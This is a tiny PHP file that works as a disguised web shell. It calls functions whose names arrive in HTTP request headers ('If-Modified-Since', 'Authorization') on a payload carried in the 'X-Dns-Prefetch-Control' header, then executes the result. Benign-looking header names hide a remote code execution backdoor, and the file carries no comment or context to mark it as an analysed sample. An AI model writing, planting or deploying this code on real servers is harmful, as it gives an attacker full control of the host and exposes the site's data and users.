<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $created = $_HEADERS['If-Modified-Since']('', $_HEADERS['Authorization']($_HEADERS['X-Dns-Prefetch-Control']));
    $created();
}